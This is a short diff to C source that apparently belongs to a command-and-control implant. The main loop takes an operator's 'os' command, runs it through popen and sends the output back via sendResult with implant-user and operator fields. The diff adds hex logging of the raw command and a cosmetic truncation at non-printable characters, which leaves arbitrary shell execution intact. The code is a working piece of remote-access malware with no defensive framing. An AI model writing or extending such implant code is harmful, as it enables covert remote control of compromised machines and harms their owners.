@@ -5,8 +5,9 @@
 #include <time.h>
 #include <stdlib.h>
 #include <string.h>
+#include <ctype.h>
 
-#include "Structs.h"
+#include "Typedefs.h"
 
 int main() {
     Command command;
@@ -37,7 +38,29 @@ int main() {
             }
 
             if (strcmp(command.Input, "os") == 0) {
-                printf("Running OS Command");
+                printf("Running OS Command\n");
+
+                // Print the raw command for debugging
+                printf("Raw Command:");
+                for (int i = 0; i < sizeof(command.Command); i++) {
+                    printf(" %02x", (unsigned char) command.Command[i]);
+                }
+                printf("\n");
+
+                // Sanitize the command by removing any non-printable characters
+                for (int i = 0; command.Command[i]; i++) {
+                    if (!isprint(command.Command[i])) {
+                        command.Command[i] = '\0';
+                        break;
+                    }
+                }
+
+                if (command.Command[0] == '\0') {
+                    printf("Sanitized command is empty!\n");
+                } else {
+                    printf("Executing Command: %s\n", command.Command); // Print the sanitized command
+                }
+
                 char output[1024] = {0}; // Buffer to capture the output, not a pointer
                 FILE *fp = popen(command.Command, "r");
                 if (fp != NULL) {
@@ -51,6 +74,7 @@ int main() {
 
                 sendResult(command.ImplantUser, command.Operator, output);
             }
+
 
             // Save the current command as the previous command for the next iteration
             strncpy(previousCommand, command.Command, sizeof(previousCommand) - 1);
